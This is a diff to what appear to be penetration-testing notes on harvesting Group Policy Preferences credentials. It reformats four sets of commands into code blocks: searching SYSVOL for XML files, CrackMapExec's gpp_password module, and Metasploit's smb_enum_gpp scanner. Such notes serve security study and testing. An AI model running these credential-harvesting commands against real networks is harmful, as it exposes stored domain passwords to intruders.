@@ -8,19 +8,27 @@ Unsecured credentials in Group Policy Preferences (GPP) can be an easy way to ob
 
 #### Enumerating Credentials Directly on the SYSVOL Share
 
-`dir /s * .xml`
+```bash
+dir /s * .xml
+```
 
 #### Enumerating Credentials Remotely from SYSVOL
 
-`dir /s \\[FQN]\SYSVOL\[FQDN\ | more`
+```bash
+dir /s \\[FQN]\SYSVOL\[FQDN\ | more
+```
 
 #### Enumerating Credentials using CrackMapExec
 
-`crackmapexec smb [IP] -u [USERNAME] -p [PASSWORD] -M gpp_password`
+```bash
+crackmapexec smb [IP] -u [USERNAME] -p [PASSWORD] -M gpp_password
+```
 
 #### Enumerating Credentials using Metasploit
 
-1. `use auxiliary/scanner/smb/smb_enum_gpp`
-2. `set rhosts [IP_Addresses]`
-3. `set SMBUser [USERNAME]`
-4. `set SMBPass [PASSWORD]`
+```bash
+use auxiliary/scanner/smb/smb_enum_gpp
+set rhosts [IP_Addresses]
+set SMBUser [USERNAME]
+set SMBPass [PASSWORD]
+```
